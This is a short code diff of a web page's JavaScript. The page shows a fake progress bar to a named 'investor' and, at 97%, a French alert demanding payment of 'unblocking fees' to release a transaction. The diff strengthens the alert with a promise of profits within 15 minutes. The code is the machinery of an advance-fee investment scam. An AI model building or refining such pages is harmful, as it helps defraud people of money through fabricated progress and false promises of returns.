@@ -170,7 +170,7 @@
         let interval;
 
         function progress() {
-            if (percent <= 97) {
+            if (percent <= 99) {
                 progressBar.style.width = percent + '%';
                 progressPercent.textContent = percent + '%';
                 percent++;
@@ -179,7 +179,7 @@
             }
 
             if (percent == 97) {
-                document.querySelector('#alert-msg').innerText = 'Alert : Mr/Mme ' + investorName + ' Veuillez payer les frais de deblocage afin de valider votre transaction.';
+                document.querySelector('#alert-msg').innerText = 'Alert : Mr/Mme ' + investorName + ' Veuillez payer les frais de deblocage afin de valider votre transaction et recevoir immediatement vos benefices dans les 15 minutes.';
             }
         }
     </script>
